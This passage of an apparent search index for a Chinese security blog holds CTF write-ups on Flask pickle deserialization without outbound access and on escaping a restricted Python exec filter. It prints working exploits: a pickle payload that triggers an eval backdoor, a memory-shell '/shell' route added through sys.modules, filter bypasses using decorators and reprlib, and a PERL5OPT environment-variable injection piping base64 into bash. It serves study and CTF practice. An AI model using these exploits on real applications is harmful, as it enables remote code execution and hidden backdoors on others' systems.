( io . BytesIO ( s )) . load () @app . route ( '/' ) def index (): info = request . args . get ( 'name' , '' ) if info is not '' : x = base64 . b64decode ( info ) User = restricted_loads ( x ) return render_template_string ( 'Hello' ) if __name__ == '__main__' : app . run ( host = '0.0.0.0' , debug = True , port = 5000 ) # config.py notadmin = { \"admin\" : \"no\" } def backdoor ( cmd ): if notadmin [ \"admin\" ] == \"yes\" : s = '' . join ( cmd ) eval ( s ) \u53ef\u4ee5\u770b\u51fa\u6765\u662f\u4e2a\u7b80\u5355\u7684pickle\u53cd\u5e8f\u5217\u5316\uff0c\u8fd9\u4e0d\u662f\u672c\u6b21\u7684\u91cd\u70b9\uff0c\u91cd\u70b9\u662f\u8fd9\u9053\u9898\u5728eval\u540e\u5982\u4f55\u56de\u663e\uff0c\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u60f3\u5230\u7684\u662f\u53cd\u5f39shell\uff0c\u4f46\u662f\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u76ee\u6807\u673a\u5668\u5e76\u4e0d\u51fa\u7f51\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5bfb\u627e\u5176\u4ed6\u7684\u65b9\u5f0f\u53bb\u8ba9\u6211\u4eec\u7684\u547d\u4ee4\u56de\u663e","title":"\u524d\u8a00"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/#debug\u6a21\u5f0f\u4e0b\u5229\u7528\u62a5\u9519","text":"\u4f17\u6240\u5468\u77e5\uff0c\u5728flask\u4e2d\u5982\u679c\u5f00\u542f\u4e86debug\u6a21\u5f0f\uff0c\u62a5\u9519\u662f\u4f1a\u663e\u793a\u8be6\u7ec6\u4fe1\u606f\u7684\uff0c\u6bd4\u8d5b\u4e2ddebug\u6a21\u5f0f\u901a\u5e38\u8003\u70b9\u662f\u6784\u9020pin\u7801\uff0c\u4f46\u662f\u6211\u4eec\u8fd9\u91cc\u60f3\u5230\uff0c\u53ef\u4ee5\u901a\u8fc7\u624b\u52a8\u63a7\u5236\u62a5\u9519\u7684\u65b9\u5f0f\u6765\u8ba9\u6211\u4eec\u7684\u547d\u4ee4\u56de\u663e\u3002 \u7b80\u5355\u5730\u6784\u9020exp\uff0c\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662feval\u5e76\u4e0d\u80fd\u6267\u884cpython\u8bed\u53e5\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5229\u7528eval\u53bb\u8c03\u7528exec\u6765\u5b9e\u73b0\u624b\u52a8\u629b\u51fa\u62a5\u9519 from base64 import b64encode from urllib.parse import quote def base64_encode ( s : str , encoding = 'utf-8' ) -> str : return b64encode ( s . encode ()) . decode ( encoding = encoding ) exc = \"raise Exception(__import__('os').popen('whoami').read())\" exc = base64_encode ( exc ) . encode () opcode = b '''cconfig notadmin (S'admin' S'yes' u0(cconfig backdoor (S'exec(__import__(\"base64\").b64decode(b\" %s \"))' lo.''' % ( exc ) print ( quote ( b64encode ( opcode ) . decode ())) \u53ef\u4ee5\u770b\u5230\u6211\u4eec\u6210\u529f\u901a\u8fc7Exception\u53bb\u62ff\u5230\u4e86\u56de\u663e","title":"debug\u6a21\u5f0f\u4e0b\u5229\u7528\u62a5\u9519"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/#\u975edebug\u6a21\u5f0f\u4e0b\u5229\u7528\u5185\u5b58\u9a6c","text":"\u8fd9\u91cc\u4e86\u53c2\u8003\u6587\u7ae0: iceyhexman/flask memory shell \u8fd9\u7bc7\u6587\u7ae0\u662fssti\u4e0b\u5982\u4f55\u5229\u7528flask\u53bb\u6dfb\u52a0\u4e00\u4e2a\u540e\u95e8\u8def\u7531\uff0c\u6211\u4eec\u53ef\u4ee5\u53c2\u8003\u4ed6\u7684\u60f3\u6cd5\u6765\u5c1d\u8bd5\u83b7\u53d6app\u6dfb\u52a0\u540e\u95e8\u8def\u7531\uff0c\u8fd9\u91cc\u4e00\u4e2a\u96be\u70b9\u662f\u5982\u4f55\u62ff\u5230\u6b63\u5728\u8fd0\u884c\u7684app","title":"\u975edebug\u6a21\u5f0f\u4e0b\u5229\u7528\u5185\u5b58\u9a6c"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/#\u5931\u8d25\u7684\u5c1d\u8bd5-\u76f4\u63a5import\u6a21\u5757\u83b7\u53d6app","text":"\u4e00\u5f00\u59cb\u60f3\u5230\u7684\u65b9\u6cd5\u662f\u76f4\u63a5 import app.py \u6765\u83b7\u53d6app\uff0c\u4f46\u662f\u4e8b\u5b9e\u8bc1\u660e\u6b64app\u975e\u5f7capp\uff0c\u6dfb\u52a0\u4e86\u8def\u7531\u4f46\u662f\u5e76\u4e0d\u80fd\u8bbf\u95ee\u5230\uff0c\u5e94\u8be5\u662f\u4e00\u4e2a\u5168\u65b0\u7684app","title":"\u5931\u8d25\u7684\u5c1d\u8bd5: \u76f4\u63a5import\u6a21\u5757\u83b7\u53d6app"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/#\u6210\u529f\u7684\u5c1d\u8bd5-sysmodules","text":"sys.modules\u662f\u4e00\u4e2a\u5168\u5c40\u5b57\u5178\uff0c\u8be5\u5b57\u5178\u662fpython\u542f\u52a8\u540e\u5c31\u52a0\u8f7d\u5728\u5185\u5b58\u4e2d\u3002\u6bcf\u5f53\u7a0b\u5e8f\u5458\u5bfc\u5165\u65b0\u7684\u6a21\u5757\uff0csys.modules\u90fd\u5c06\u8bb0\u5f55\u8fd9\u4e9b\u6a21\u5757\u3002\u5b57\u5178sys.modules\u5bf9\u4e8e\u52a0\u8f7d\u6a21\u5757\u8d77\u5230\u4e86\u7f13\u51b2\u7684\u4f5c\u7528\u3002\u5f53\u67d0\u4e2a\u6a21\u5757\u7b2c\u4e00\u6b21\u5bfc\u5165\uff0c\u5b57\u5178sys.modules\u5c06\u81ea\u52a8\u8bb0\u5f55\u8be5\u6a21\u5757\u3002\u5f53\u7b2c\u4e8c\u6b21\u518d\u5bfc\u5165\u8be5\u6a21\u5757\u65f6\uff0cpython\u4f1a\u76f4\u63a5\u5230\u5b57\u5178\u4e2d\u67e5\u627e\uff0c\u4ece\u800c\u52a0\u5feb\u4e86\u7a0b\u5e8f\u8fd0\u884c\u7684\u901f\u5ea6\u3002 \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7sys.modules\u62ff\u5230\u5f53\u524d\u5df2\u7ecf\u5bfc\u5165\u7684\u6a21\u5757\uff0c\u5e76\u4e14\u83b7\u53d6\u6a21\u5757\u4e2d\u7684\u5c5e\u6027\uff0c\u7531\u4e8e\u6211\u4eec\u6700\u7ec8\u7684eval\u662f\u5728app.py\u4e2d\u6267\u884c\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 sys.modules['__main__'] \u6765\u83b7\u53d6\u5f53\u524d\u7684\u6a21\u5757\uff0c\u6211\u4eec\u5199\u4e2a\u7b80\u5355\u7684\u6d4b\u8bd5\u6765\u770b\u770b\u4e0a\u9762\u7684app\u4e0e\u5b9e\u9645\u7684app\u662f\u5426\u76f8\u540c import sys import app app1 = sys . modules [ '__main__' ] . __dict__ [ 'app' ] app2 = app . app print ( id ( app1 )) print ( id ( app2 )) \u53ef\u4ee5\u770b\u5230app\u7684id\u5e76\u4e0d\u76f8\u540c\uff0c\u6240\u4ee5\u4ed6\u4eec\u5e76\u975e\u76f8\u540c\u7684app \u8fd9\u91cc\u6211\u4eec\u5c1d\u8bd5\u76f4\u63a5\u6dfb\u52a0\u540e\u95e8\u8def\u7531\uff0c\u4f1a\u53d1\u73b0\u5b58\u5728\u62a5\u9519 import sys import os sys . modules [ '__main__' ] . __dict__ [ 'app' ] . add_url_rule ( '/shell' , 'shell' , lambda : os . popen ( 'dir' ) . read ()) \u8fd9\u4e2a\u62a5\u9519\u662f\u7531\u4e8e\u6211\u4eec\u5728\u7b2c\u4e00\u4e2a\u8bf7\u6c42\u5904\u7406\u540e\u8c03\u7528\u4e86\u8bbe\u7f6e\u51fd\u6570(add url rule)\uff0c\u6b64\u62a5\u9519\u53ea\u4f1a\u5728debug\u6a21\u5f0f\u4e0b\u89e6\u53d1\uff0c\u53ef\u4ee5\u53c2\u8003\u4f7f\u7528\u4e86Flask\u6846\u67b6\u7684\u5de5\u5177\u7684issue: - https://github.com/alexmclarty/mirror/issues/6 - https://github.com/pallets/flask/issues/2616 \u6240\u4ee5\u6211\u4eec\u9700\u8981\u5728\u975edebug\u6a21\u5f0f\u4e0b\u624d\u80fd\u6210\u529f\u6dfb\u52a0\u540e\u95e8\u8def\u7531(\u53c8\u6216\u8005\u6211\u4eec\u76f4\u63a5\u8bbe\u7f6edebug=False\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898) import sys sys . modules [ '__main__' ] . __dict__ [ 'app' ] . debug = False sys . modules [ '__main__' ] . __dict__ [ 'app' ] . add_url_rule ( '/shell' , 'shell' , lambda : __import__ ( 'os' ) . popen ( 'dir' ) . read ())","title":"\u6210\u529f\u7684\u5c1d\u8bd5: sys.modules"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/python%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E9%BB%91%E9%AD%94%E6%B3%95/","text":"python\u53d7\u9650\u7684\u4efb\u610f\u4ee3\u7801\u6267\u884c\u4e0e\u9ed1\u9b54\u6cd5 # \u8d77\u56e0 # \u5728NCTF/NJUPTCTF 2021\u4e2d\u6709\u4e00\u9053misc\u9898: \u6211\u4eec\u53ef\u7231\u7684Hex\u9171\u53c8\u6709\u4e86\u4e00\u4e2a\u5f3a\u5927\u7684\u529f\u80fd \uff0c \u53ef\u4ee5\u53bb\u6267\u884c\u591a\u884c\u8bed\u53e5\u60f9 ~ \u4f46\u662f\u4e3a\u4e86\u9632\u6b62\u6709\u4e9b\u5c45\u5fc3\u53f5\u6d4b\u7684\u4eba \uff0c \u6211\u4eec\u4e13\u95e8\u628a\u62ec\u53f7 \uff0c \u5355\u53cc\u5f15\u53f7 \uff0c \u90fd\u8fc7\u6ee4\u6389 \uff0c \u5662\u5bf9\u4e0d\u51c6\u8272\u8272 \uff0c \u6240\u4ee5\u4e5f\u4e0d\u51c6\u51fa\u73b0h\u54df ~ Ubuntu Python3 .6.9 \u5feb\u53bb\u627eHex\u9171 ( QQ : 2821876761 ) \u79c1\u804a\u5427 \u9644\u4ef6 \uff1a https : // nctf . slight - wind . com / misc / hex / runner . py https : // attachment . h4ck . fun : 9000 / misc / hex / runner . py \u5176\u4e2d\u9644\u4ef6\u5185\u5bb9\u5982\u4e0b: import sys from base64 import b64decode code = sys . argv [ 1 ] try : data = b64decode ( code . encode ()) . decode () except : exit ( 0 ) for c in 'h\" \\' (' : if c in data : exit ( 0 ) exec ( data ) \u8fd9\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u53d7\u9650\u5236\u7684python\u4ee3\u7801\u6267\u884c\uff0c\u4e0d\u80fd\u4f7f\u7528h\uff0c\u5355\u5f15\u53f7\uff0c\u53cc\u5f15\u53f7\uff0c\u5de6\u62ec\u53f7\u5b57\u7b26\u3002\u6211\u4eec\u77e5\u9053\u5728SSTI\u4e2d\u6211\u4eec\u5982\u679c\u7981\u7528\u4e86\u5c0f\u62ec\u53f7\u7684\u8bdd\u662f\u6ca1\u529e\u6cd5\u4efb\u610f\u547d\u4ee4\u6267\u884c\u7684\uff0c\u4f46\u662f\u5728\u4efb\u610fpython\u4ee3\u7801\u6267\u884c\u7684\u60c5\u51b5\u4e0b\u8fd8\u6709\u8f6c\u673a\u5417\uff1f \u6b63\u89e3: \u88c5\u9970\u5668 # \u6b63\u89e3\u4e0d\u662f\u672c\u7bc7\u6587\u7ae0\u4e3b\u8981\u8ba8\u8bba\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u4e5f\u4ecb\u7ecd\u4e00\u4e0b\uff0c\u5176\u5b9e\u5c31\u662fpython\u88c5\u9970\u5668\u7684\u6280\u5de7\uff0c\u4e00\u4e2a\u7b80\u5355\u7684python\u88c5\u9970\u5668\u5982\u4e0b: def log ( func ): def wrapper ( * args , ** kw ): print ( \"here is a log\" ) func () return wrapper @log def func (): print ( \"hello world\" ) func () \u8fd9\u91cc\u7684 @log \u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u8bed\u6cd5\u7cd6\uff0c\u4ed6\u7b49\u4ef7\u4e8e func=log(func) \uff0c\u4e5f\u5c31\u662f\u8bf4\u8fd9\u91cc\u9690\u5f0f\u5305\u542b\u4e86\u51fd\u6570\u8c03\u7528\uff0c\u540c\u65f6 \u88c5\u9970\u5668\u662f\u53ef\u4ee5\u5d4c\u5957\u7684 \uff0c\u5e76\u4e14\u80fd\u591f\u7528\u4e8e \u88c5\u9970\u7c7b \u3002 \u4f46\u662f\u8fd9\u91cc\u6211\u4eec\u4f9d\u7136\u7528\u5230\u4e86\u5c0f\u62ec\u53f7\uff0c\u6211\u4eec\u600e\u6837\u624d\u80fd\u907f\u514d\u8fd9\u4e2a\u60c5\u51b5\u5462\uff1f\u5b9e\u9645\u4e0a\u662f\u7528\u5230\u4e86python\u7684(\u6b8b\u5e9f)\u533f\u540d\u51fd\u6570\uff0c\u4e00\u4e2a\u7b80\u5355\u7684python\u533f\u540d\u51fd\u6570\u5982\u4e0b: func = lambda _ : \"system\" # \u610f\u601d\u662f\u65e0\u8bba\u4f20\u5165\u4ec0\u4e48\u53c2\u6570\u6700\u7ec8\u90fd\u4f1a\u8fd4\u56desystem\u8fd9\u4e2a\u5b57\u7b26\u4e32 print ( func ( \"anything\" )) # system \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5d4c\u5957\u7684\u88c5\u9970\u5668\u53bb\u8c03\u7528 os.system() , \u4f8b\u5982: from os import system c = lambda _ : \"whoami\" @system @c class x : pass \u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u662f system(c(x)) \uff0c\u800cc\u51fd\u6570\u4e0d\u7ba1\u4f20\u5165\u4ec0\u4e48\u90fd\u4f1a\u8fd4\u56de\"whoami\"\u8fd9\u4e2a\u5b57\u7b26\u4e32\uff0c\u6700\u7ec8\u5b9e\u73b0\u547d\u4ee4\u6267\u884c \u8fd9\u91cc\u8fd8\u6709\u6700\u540e\u4e00\u4e2a\u95ee\u9898\u662f\u5982\u4f55\u6784\u9020\u5b57\u7b26\u4e32\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u6ca1\u529e\u6cd5\u4f7f\u7528\u5355\u5f15\u53f7\u6216\u8005\u53cc\u5f15\u53f7\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5229\u7528\u4e00\u4e9bpython\u539f\u751f\u7684\u5b57\u7b26\u4e32\uff0c\u6bd4\u5982\u67d0\u4e9b\u7c7b\u7684 __doc__ ,\u6bd4\u5982\u5b57\u5178(dict)\u7684doc\u5982\u4e0b: dict() -> new empty dictionary dict(mapping) -> new dictionary initialized from a mapping object's (key, value) pairs dict(iterable) -> new dictionary initialized as if via: d = {} for k, v in iterable: d[k] = v dict(**kwargs) -> new dictionary initialized with the name=value pairs in the keyword argument list. For example: dict(one=1, two=2) \u8fd9\u91cc\u9762\u57fa\u672c\u4e0a\u5b58\u5728\u6211\u4eec\u9700\u8981\u7684\u82f1\u6587\u5b57\u7b26\uff0c\u53ef\u4ee5\u4f7f\u7528 {}.__doc__[index] \u7684\u5f62\u5f0f\u83b7\u53d6\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6700\u7ec8\u7684exp\u53ef\u4ee5\u662f: from os import system n = {} . __doc__ f = lambda _ : n [ 2 ] + n [ 80 ] + n [ 55 ] + n [ 6 ] + n [ 75 ] + n [ 69 ] + n [ 80 ] + n [ 88 ] # cat flag @system @f class x : pass \u5bfb\u627e\u975e\u9884\u671f # \u5982\u679c\u6211\u4eec\u4e0d\u4f7f\u7528\u88c5\u9970\u5668\u7684\u65b9\u6cd5\uff0c\u8fd9\u9053\u9898\u76ee\u8fd8\u6709\u505a\u6cd5\u5417\uff1f\u6362\u53e5\u8bdd\u8bf4\u5047\u5982\u6211\u4eec\u4e0d\u5141\u8bb8\u4ee3\u7801\u4e2d\u5b58\u5728@\u8fd9\u4e2a\u5b57\u7b26\uff0c\u8fd9\u9053\u9898\u8fd8\u80fd\u591f\u89e3\u5417\uff1f\u7b54\u6848\u662f\u80af\u5b9a\u7684\u3002 \u6240\u4ee5\u6211\u4eec\u7684\u9898\u76ee\u53d8\u6210: import sys from base64 import b64decode code = sys . argv [ 1 ] try : data = b64decode ( code . encode ()) . decode () except : exit ( 0 ) for c in 'h@\" \\' (' : if c in data : exit ( 0 ) exec ( data ) \u8fd9\u91cc\u6211\u4eec\u91cd\u65b0\u601d\u8003\u4e00\u4e0b\uff0c\u6211\u4eec\u5728\u6ca1\u6709\u5c0f\u62ec\u53f7\u4f7f\u7528\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd8\u6709\u4ec0\u4e48\u80fd\u591f\u4f7f\u7528\u5462\uff1f\u7b54\u6848\u662f\u4e2d\u62ec\u53f7\uff0c\u6211\u4eec\u77e5\u9053\uff0c\u5982\u679c\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528\u4e2d\u62ec\u53f7\u6839\u636e\u7d22\u5f15\u53bb\u83b7\u53d6\u5bf9\u8c61\u65f6\uff0c\u5b9e\u9645\u4e0a\u662f\u8c03\u7528\u4e86\u7c7b\u4e2d\u7684 __getitem__ \u65b9\u6cd5\uff0c\u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b\u5982\u4e0b: class C : def __getitem__ ( self , key ): return str ( key ) + \"111\" c = C () print ( c [ \"qwe\" ]) # qwe111 \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u7684 __getitem__ \u9b54\u672f\u65b9\u6cd5\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u65b9\u6cd5\uff0c\u5f53\u6211\u4eec\u8c03\u7528 c[\"anything\"] \u7684\u662f\u65f6\u5019\u5b9e\u9645\u4e0a\u8c03\u7528\u4e86 c.__getitem__(\"qwe\") \uff0c\u8fd9\u6837\u6211\u4eec\u5373\u4f7f\u6ca1\u6709\u5c0f\u62ec\u53f7\u4e5f\u80fd\u591f\u8fdb\u884c\u51fd\u6570\u8c03\u7528\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u8986\u76d6\u67d0\u4e9b\u7c7b\u7684 __getitem__ \u65b9\u6cd5\u4e3a\u4e00\u4e9b\u81ea\u5e26\u65b9\u6cd5\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5b9e\u73b0\u547d\u4ee4\u6267\u884c\u4e86\u3002 \u5931\u8d25\u7684\u5c1d\u8bd5: \u8986\u76d6\u81ea\u5e26\u7c7b\u7684 getitem # \u6211\u7684\u7b2c\u4e00\u4e2a\u60f3\u6cd5\u662f\u8986\u76d6python\u81ea\u5e26\u7c7b\u7684 __getitem__ \u65b9\u6cd5\uff0c\u4f8b\u5982list\u6216\u8005dict\uff0c\u4f46\u662f\u7ecf\u8fc7\u6d4b\u8bd5\u4e4b\u540e\u53d1\u73b0\u8fd9\u662f\u884c\u4e0d\u901a\u7684: \u6240\u4ee5\u6211\u4eec\u7684\u76ee\u7684\u5c31\u662f\u8981\u627e\u5230\u4e00\u4e2a\u7c7b\u80fd\u591f\u8986\u76d6\u5176 __getitem__ \u5e76\u4e14\u80fd\u83b7\u53d6\u5230\u8fd9\u4e2a \u7c7b\u7684\u5b9e\u4f8b \uff0c\u8fd9\u91cc\u7684\u91cd\u70b9\u662f\u83b7\u53d6\u5230\u7c7b\u7684\u5b9e\u4f8b\uff0c\u56e0\u4e3a\u6211\u4eec\u5c31\u7b97\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u7c7b\uff0c\u4e5f\u65e0\u6cd5\u83b7\u53d6\u8fd9\u4e2a\u7c7b\u7684\u5b9e\u4f8b\uff0c\u56e0\u4e3a \u83b7\u53d6\u7c7b\u7684\u5b9e\u4f8b\u4e5f\u9700\u8981\u5c0f\u62ec\u53f7 \u6210\u529f\u7684\u5c1d\u8bd5: python\u6807\u51c6\u5e93\u91cc\u7684\u9b54\u672f # \u6211\u4eec\u5c1d\u8bd5\u4ecepython\u6807\u51c6\u5e93\u4e2d\u627e\u5230\u4e00\u4e2a\u7b26\u5408\u6211\u4eec\u6807\u51c6\u7684\u5e93\uff0cpython\u7684\u6807\u51c6\u5e93\u53c2\u8003 \u8fd9\u91cc \u5728\u4e00\u756a\u5bfb\u627e\u540e\uff0c\u6211\u4eec\u5c06\u76ee\u5149\u6295\u5411 reprlib \u8fd9\u4e2a\u5e93\uff0c\u5b83\u5b8c\u7f8e\u7b26\u5408\u4e86\u6211\u4eec\u7684\u8981\u6c42! \u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b\u5982\u4e0b: import reprlib reprlib . Repr . __getitem__ = exec a = reprlib . aRepr a [ \"print('whoami')\" ] \u6240\u4ee5\u6211\u4eec\u6700\u7ec8\u7684exp\u6784\u9020\u5927\u81f4\u5982\u4e0b: 1. \u4ece\u6807\u51c6\u5e93\u4e2d\u5f15\u5165reprlib\u8fd9\u4e2a\u5e93 2. \u8986\u76d6 reprlib.Repr \u7684 __getitem__ \u65b9\u6cd5\u4e3achr\u65b9\u6cd5 3. \u901a\u8fc7 reprlib.aRepr \u4e2d\u62ec\u53f7\u8c03\u7528\u6784\u9020\u4efb\u610f\u5b57\u7b26\u4e32 4. \u518d\u6b21\u8986\u76d6\u4e3a exec \u65b9\u6cd5 5. \u771f\u6b63\u610f\u4e49\u4e0a\u7684python\u4ee3\u7801\u6267\u884c \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u7531\u4e8eh\u4e5f\u88ab\u7981\u7528\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5 reprlib.Repr.__getitem__=chr \uff0c\u9700\u8981\u8d70\u4e00\u4e0b\u5f2f\u8def\uff0c\u5229\u7528builtins\u5e93\u7684 __dict__ \u518d\u5229\u7528\u5b57\u5178\u7684 __doc__ \uff0c\u6211\u4eec\u6700\u7ec8\u5f97\u5230\u4e00\u4e2a\u975e\u5e38\u9177\u7684exp\u5982\u4e0b: data = \"\"\" import reprlib import builtins __=reprlib.aRepr reprlib.Repr.__getitem__ = builtins.__dict__[ {} .__doc__[2]+ {} .__doc__[280]+ {} .__doc__[28]] # chr exp=__[95]+__[95]+__[105]+__[109]+__[112]+__[111]+__[114]+__[116]+__[95]+__[95]+__[40]+__[39]+__[111]+__[115]+__[39]+__[41]+__[46]+__[115]+__[121]+__[115]+__[116]+__[101]+__[109]+__[40]+__[39]+__[119]+__[104]+__[111]+__[97]+__[109]+__[105]+__[39]+__[41] // __import__('os').system('whoami') reprlib.Repr.__getitem__ = exec reprlib.aRepr[exp] \"\"\" for c in 'h@\" \\' (' : if c in data : print ( c ) exit ( 0 ) exec ( data ) \u66f4\u8fdb\u4e00\u6b65 # \u5b9e\u9645\u4e0apython\u662f\u652f\u6301Non-ASCII Identifies\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u4f7f\u7528unicode\u5b57\u7b26\u7684\uff0c\u5177\u4f53\u53c2\u8003\u89c1: https://peps.python.org/pep-3131/ \uff0c\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e00\u70b9: The following changes will need to be made to the parser: 1. If a non-ASCII character is found in the UTF-8 representation of the source code, a forward scan is made to find the first ASCII non-identifier character (e.g. a space or punctuation character) 2. The entire UTF-8 string is passed to a function to normalize the string to NFKC, and then verify that it follows the identifier syntax. No such callout is made for pure-ASCII identifiers, which continue to be parsed the way they are today. The Unicode database must start including the Other ID property. 3. If this specification is implemented for 2.x, reflective libraries (such as pydoc) must be verified to continue to work when Unicode strings appear in __dict__ slots as keys. \u7a0d\u5fae\u7ffb\u8bd1\u4e00\u4e0b\u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u6211\u4eec\u4f7f\u7528\u4e86UTF-8\u4e2d\u7684\u975eASCII\u7801\u4f5c\u4e3a\u6807\u8bc6\u7b26\uff0c\u90a3\u4e48\u5176\u4f1a\u88ab\u51fd\u6570\u8f6c\u6362\u4e3aNFKC\u6807\u51c6\u683c\u5f0f\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4f8b\u5982 \u02b0 \u6765\u4ee3\u66ff h \uff0c\u4ece\u800c\u7ed5\u8fc7\u9650\u5236\u3002 \u4f46\u662f\u5047\u5982\u6211\u4eec\u7684\u9898\u76ee\u4f1a\u5c06\u7528\u6237\u8f93\u5165\u5148\u8f6c\u6362\u4e3aNFKC\u6807\u51c6\u683c\u5f0f\u518d\u8fdb\u884c\u5224\u65ad\uff0c\u5e76\u4e14\u5c06 _ \u8fd9\u4e2a\u5b57\u7b26\u4e5f\u8fc7\u6ee4\uff0c\uff0c\u6211\u4eec\u8fd8\u6709\u529e\u6cd5\u5b9e\u73b0\u4efb\u610f\u4ee3\u7801\u6267\u884c\u5417\uff1f from unicodedata import normalize data = input () data = normalize ( \"NFKC\" , data ) for c in 'h@\" \\' (_' : if c in data : print ( c ) exit ( 0 ) exec ( data ) \u5f88\u660e\u663e\uff0c\u6211\u4eec\u6ca1\u529e\u6cd5\u518d\u8986\u76d6\u4e00\u4e9b\u9b54\u672f\u65b9\u6cd5(\u56e0\u4e3a\u65b9\u6cd5\u540d\u5305\u542b_)\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u6211\u4eec\u8fd8\u662f\u80fd\u901a\u8fc7\u4e00\u4e9b\u64cd\u4f5c\u6765\u8fdb\u884crce\u7684\uff0c\u8fd9\u4e2arce\u65b9\u5f0f\u5c31\u662f\u73af\u5883\u53d8\u91cf\u6ce8\u5165,\u5177\u4f53\u6587\u7ae0\u53ef\u53c2\u8003 ## HACKING WITH ENVIRONMENT VARIABLES \u6211\u4eec\u8fd9\u91cc\u5148\u8d34\u51fa\u6700\u7ec8\u7684exp\uff0c\u7136\u540e\u518d\u5206\u6790\u5176\u539f\u7406: from string import printable from base64 import b64decode from unicodedata import normalize def translate ( s ): r = \"\" for c in s : r += f \"x[ { printable . find ( c ) } ]+\" return r . rstrip ( \"+\" ) code = f \"\"\" from os import environ from string import printable as x environ[ { translate ( \"PERL5OPT\" ) } ] = { translate ( \"-Mbase;system('echo$IFS$9bHM=|base64$IFS$9-d|bash');exit;\" ) } environ[ { translate ( \"BROWSER\" ) } ] = { translate ( \"perlthanks\" ) } import antigravity \"\"\" # exp normalize ( \"NFKC\" , code ) for c in 'h\" \\' (@_' : if c in code : print ( \"no!!!!\" ) exit ( 0 ) exec ( code ) \u8fd9\u4e2aexp\u5b9e\u9645\u4e0a\u5229\u7528\u5230\u4e86perl\u7684\u73af\u5883\u53d8\u91cf\u6ce8\u5165\uff0c\u8fd9\u91cc\u4e0d\u5bf9perl\u505a\u8fc7\u591a\u7684\u6df1\u5165\u7814\u7a76\uff0c\u5927\u6982\u539f\u7406\u662f\u5728perl\u8fd0\u884c\u65f6\u4f1a\u4f7f\u7528\u5230 PERL5OPT \u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u6307\u5b9a -M \u9009\u9879\u5bfc\u5165\u6a21\u5757\uff0c\u540c\u65f6\u5728\u8fd9\u4e4b\u540e\u53ef\u4ee5\u6ce8\u5165\u4e00\u6bb5perl\u4ee3\u7801\uff0c\u5229\u7528\u8fd9\u4e2a\u6700\u7ec8\u5b9e\u73b0\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002 \u6211\u4eec\u91cd\u70b9\u5173\u6ce8BROWSER\u73af\u5883\u53d8\u91cf\u548c antigravity \u8fd9\u4e2a\u6a21\u5757\u3002 antigravity \u8fd9\u4e2a\u6a21\u5757\u5b9e\u9645\u4e0a\u662f\u5728python\u6dfb\u52a0\u7684\u4e00\u4e2a\u5723\u8bde\u8282\u5f69\u86cb\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 \u8fd9\u91cc \u770b\u5230\u5b83\u7684\u6e90\u7801: \u8fd9\u91cc\u552f\u4e00\u503c\u5f97\u6ce8\u610f\u7684\u662f\u5176\u5728\u88ab\u5bfc\u5165\u65f6\u4f1a\u8c03\u7528 webbrowser.open() \u65b9\u6cd5\u6253\u5f00\u4e00\u4e2a\u7f51\u7ad9\uff0c\u6211\u4eec\u5728cpython\u4e2d\u770b\u770b\u5176 \u4ee3\u7801 